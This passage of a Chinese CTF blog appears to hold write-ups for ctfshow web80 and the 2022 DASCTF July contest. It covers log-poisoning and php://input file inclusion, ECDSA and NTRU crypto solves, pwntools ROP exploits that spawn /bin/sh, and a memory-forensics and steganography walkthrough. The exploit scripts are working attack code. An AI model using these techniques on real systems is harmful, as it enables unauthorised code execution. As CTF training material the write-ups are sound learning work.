+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//web80题目</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"> <span class="comment">//没有对输入进行限制和处理所以此处我们可以通过大小写绕过；</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>传输后发现日志中记载的是UA头，所以可以通过bp再UA头中构造语句获得flag</p>
+<p><img src="/ctfshow_web78~web81/image-20220724161603151.png" alt="image-20220724161603151"></p>
+<p>先查看文件</p>
+<p><img src="/ctfshow_web78~web81/image-20220724163900808.png" alt="image-20220724163900808"></p>
+<p>获取flag（至于这里为甚么用base64有点不明白，猜测：可能文件使用的是base64加密吧，不过使用vi和vim也可以获得flag）</p>
+<p><img src="/ctfshow_web78~web81/image-20220724164056572.png" alt="image-20220724164056572"></p>
+<p><img src="/ctfshow_web78~web81/image-20220724164233173.png" alt="image-20220724164233173"></p>
+<p>（两道题都可以使用这种日志包含的思路web81的具体过程就不在此具体赘述）</p>
+<h2 id="web80的第二种解法（php：-input）"><a href="#web80的第二种解法（php：-input）" class="headerlink" title="web80的第二种解法（php：&#x2F;&#x2F;input）"></a>web80的第二种解法（php：&#x2F;&#x2F;input）</h2><p>正如代码中注释所说我们可以利用大小写绕过后使用input协议，通过post传值进行命令执行</p>
+<p><img src="/ctfshow_web78~web81/image-20220725202045975.png" alt="image-20220725202045975"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/" class="post-title-link" itemprop="url">2022DASCTF七月赋能赛</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-25 23:39:00" itemprop="dateCreated datePublished" datetime="2022-07-25T23:39:00+08:00">2022-07-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-04-01 17:18:18" itemprop="dateModified" datetime="2023-04-01T17:18:18+08:00">2023-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Ez-to-getflag-题"><a href="#Ez-to-getflag-题" class="headerlink" title="Ez to getflag 题"></a>Ez to getflag 题</h2><p>发现有查询功能，所以一开始查flag无果，转念一想如果是linux服务器的话应该再根目录下，所以在次查询&#x2F;flag，获得flag</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.png" alt="img"></p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724185704918.png" alt="image-20220724185704918"></p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babysign"><a href="#babysign" class="headerlink" title="babysign"></a>babysign</h2><p>本题使用椭圆曲线数字签名算法，由题意得secret由flag生成，所以需要通过加密方式反推求secret（即k）的公式</p>
+<p>已知：s&#x3D;<img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002-16587282944209.gif" alt="img"> * (m + n*r) (mod gen)</p>
+<p>则：k&#x3D;<img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image004-165872829442010.gif" alt="img"> <em>(s</em>n-m) (mod gen)</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> ecdsa.ecdsa <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">R=<span class="number">0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5</span></span><br><span class="line">S=<span class="number">0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c</span></span><br><span class="line">msg=<span class="string">b&#x27;welcome to ecdsa&#x27;</span></span><br><span class="line">n=<span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line">gen = ecdsa.NIST256p.generator.order()</span><br><span class="line">m= <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">k= ((S*n-m)*gmpy2.invert(R,gen)) % gen</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(k))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="easyNTRU"><a href="#easyNTRU" class="headerlink" title="easyNTRU"></a>easyNTRU</h2><p>本题的考点是NTRU，由于e和h为多项式且项数均为10项并不多，所以可以考虑采用爆破的方法解出m</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">c=<span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line">Num = [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> Num:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> Num:</span><br><span class="line">       <span class="keyword">for</span> i3 <span class="keyword">in</span> Num:</span><br><span class="line">          <span class="keyword">for</span> i4 <span class="keyword">in</span> Num:</span><br><span class="line">              <span class="keyword">for</span> i5 <span class="keyword">in</span> Num:</span><br><span class="line">                 <span class="keyword">for</span> i6 <span class="keyword">in</span> Num:</span><br><span class="line">                    <span class="keyword">for</span> i7 <span class="keyword">in</span> Num:</span><br><span class="line">                       <span class="keyword">for</span> i8 <span class="keyword">in</span> Num:</span><br><span class="line">                          <span class="keyword">for</span> i9 <span class="keyword">in</span> Num:</span><br><span class="line">                             <span class="keyword">for</span> i10 <span class="keyword">in</span> Num:</span><br><span class="line">                                 result = [i1, i2, i3, i4, i5, i6, i7, i8, i9, i10]</span><br><span class="line">                                 m = R(result)</span><br><span class="line">                                 sha3 = SHA3_256.new()</span><br><span class="line">                                 Key = sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>))).digest()</span><br><span class="line">                                 dypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">                                 <span class="keyword">try</span>:</span><br><span class="line">                                    flag = unpad(dypher.decrypt(c), <span class="number">32</span>)</span><br><span class="line">                                    <span class="keyword">if</span>  flag.startswith(<span class="string">b&#x27;DASCTF&#x27;</span>):</span><br><span class="line">                                          <span class="built_in">print</span>(flag)</span><br><span class="line">                                          sys.exit(<span class="number">0</span>)</span><br><span class="line">                                  <span class="keyword">except</span>:</span><br><span class="line">                                     <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="eyfor题"><a href="#eyfor题" class="headerlink" title="eyfor题"></a>eyfor题</h2><p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724183747873.png" alt="image-20220724183747873"></p>
+<p>上图中的代码存在负数绕过，导致可以向<code>nbytes</code>中写入任意长度的内容造成栈溢出。</p>
+<p>将“&#x2F;bin&#x2F;sh”写入<code>nbytes</code>中，通过<code>strncpy()</code>复制到<code>buf</code>中。</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184142775.png" alt="image-20220724184142775"></p>
+<p><code>buf</code>在bss段上，函数也提供了<code>_system</code>，所以可以让<code>buf</code>作为<code>_system</code>参数。</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27055</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">ret = <span class="number">0x400915</span></span><br><span class="line">pop_rdi = <span class="number">0x0400983</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(ret) + p64(pop_rdi) +  p64(<span class="number">0x06010C0</span>)+ p64(elf.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="MyCanary2题"><a href="#MyCanary2题" class="headerlink" title="MyCanary2题"></a>MyCanary2题</h2><p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184707602.png" alt="image-20220724184707602"></p>
+<p>分析上诉代码可知，按case1、case2、case3的执行顺序即可绕过<code>if</code>的判断，并且case1存在栈溢出漏洞。</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184900448.png" alt="image-20220724184900448"></p>
+<p>程序存在<code>_system</code>和<code>/bin/sh</code>，可以覆盖返回地址并调用执行<code>system(/bin/sh)</code>获得shell</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;, 28231)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line">system_plt = elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0401613</span></span><br><span class="line">ret = <span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(<span class="number">0</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(<span class="number">0x04020F0</span>) + p64(system_plt)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But now, I have a new Secret.&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-forenisc题"><a href="#ez-forenisc题" class="headerlink" title="ez_forenisc题"></a>ez_forenisc题</h2><p>下载附件</p>
+<p>得到pc.raw和pc.wmdk，，放入取证大师中发现是个bitlocker加密的磁盘</p>
+<p>立马转移注意到pc.raw上，是个内存镜像。直接用EFDD梭出恢复密钥</p>
+<p>060841-363737-551397-247489-310134-034430-598312-215853</p>
+<p>用取证大师进行解密</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.gif" alt="图片"></p>
+<p>发现有个压缩包，导出，发现是张png图片，用stegsolve发现了rgb的0通道藏了压缩包</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image004.gif" alt="图片"></p>
+<p>保存下来，发现压缩包损坏，直接使用winrar自带的修复功能修复，发现是个加密压缩包</p>
+<p>看到了压缩包还有提示</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image006.gif" alt="图片"></p>
+<p>看来要找账户密码，用passwarekit也能梭出来</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image008.gif" alt="图片"></p>
+<p>550f37c7748e</p>
+<p>解压得到八进制的数</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image010.gif" alt="图片"></p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image012.gif" alt="图片"></p>
+<p>转为16进制是得到key是358daebef0b7d，貌似是什么的一个密钥，继续看看pc.raw</p>
+<p>用volatility分析一下，发现screenshot的截图有信息</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image014.gif" alt="图片"></p>
+<p>提示了thes3cret，filescan查找该关键字</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image016.jpg" alt="图片"></p>
+<p>发现了个文件，给它dump下来</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image018.gif" alt="图片"></p>
+<p>记事本打开发现密文</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image020.gif" alt="图片"></p>
+<p>接下来就是进行aes解密了</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image022.gif" alt="图片"></p>
+<p>DASCTF{2df05d6846ea7a0ba948da44daa7dc88}</p>
+<h2 id="哆来咪发唆拉西哆"><a href="#哆来咪发唆拉西哆" class="headerlink" title="哆来咪发唆拉西哆"></a>哆来咪发唆拉西哆</h2><p>首先得到一个pdf，binwalk后有个zip，解压后有个txt</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image024.gif" alt="图片"></p>
+<p>发现这应该是圆周率的后面的位数</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image026.gif" alt="图片"></p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image028.gif" alt="图片"></p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image030.gif" alt="图片"></p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image032.gif" alt="图片"></p>
+<p>前一组都是255而后一组数都是211，根据数组的特性用脚本将数组转化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">pi=<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360............5225161050702705623526601276484830840761183013052793205427462865403603674532865105706587488225698157936789766974220575059683440869735020141020672358502007245225632651341055924019027421624843914035998953539459094407046912091409387001264560016237428802109276457931065792295524988727584610126483699989225695968815920560010165525637567875678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;whatisthis.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">  lines=f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">  line=<span class="built_in">str</span>(line,encoding=<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  a = []</span><br><span class="line"></span><br><span class="line">  a = re.findall(<span class="string">&quot;\d+\.?\d*&quot;</span>, line)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">list</span>=[]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line"></span><br><span class="line">   s=<span class="built_in">int</span>(a[i])</span><br><span class="line"></span><br><span class="line">   <span class="built_in">list</span>.append(pi[s:s+<span class="number">3</span>:])</span><br><span class="line"></span><br><span class="line">  str_dec=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>[<span class="number">1</span>])):</span><br><span class="line"></span><br><span class="line">   s= <span class="built_in">list</span>[<span class="number">0</span>][i]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">1</span>][i] <span class="keyword">and</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">2</span>][i] <span class="keyword">and</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">3</span>][i]:</span><br><span class="line"></span><br><span class="line">​     str_dec+=s</span><br><span class="line"></span><br><span class="line">  str_hex=<span class="built_in">hex</span>(<span class="built_in">int</span>(str_dec))</span><br><span class="line"></span><br><span class="line">  str_hex=str_hex[<span class="number">2</span>:<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(str_hex)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">   str_hex=<span class="string">&#x27;0&#x27;</span>+str_hex</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(str_hex,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image034.gif" alt="图片"></p>
+<p>运行得到</p>
+<p><code>ffd8ffe11b0245786966000049492a00080000000c000001030001000000ee02000001010300010000001a02000002010300030000009e0000000601030001000000020000001201030001000000010000001501030001000000030000001a01050001000000a40000001b01050001000000ac000000280103000100000002000000310102001e000000b40000003201020014000000d20000006987040001000000e80000002001000008000800080080fc0a001027000080fc0a001027000041646f62652050686f746f73686f7020435336202857696e646f77732900323032323a30343a32382031303a31343a35380000000400009007000............55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec593b15762c5d8abb15762aff00ffd9</code></p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image036.gif" alt="图片"></p>
+<p>转化后得到一张图片，保存后发现</p>
+<p><img src="/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image038.jpg" alt="图片"></p>
+<p>flag是10000后缺失的30个数字</p>
+<p>DASCTF{566722796619885782794848855834}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/14/ctfshow_web89~web97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/14/ctfshow_web89~web97/" class="post-title-link" itemprop="url">PHP特性(web89~web97)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-14 20:18:00 / 修改时间：20:23:10" itemprop="dateCreated datePublished" datetime="2022-07-14T20:18:00+08:00">2022-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%AC%94%E8%AE%B0/web%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">web笔记</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/ctfshow%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctfshow刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
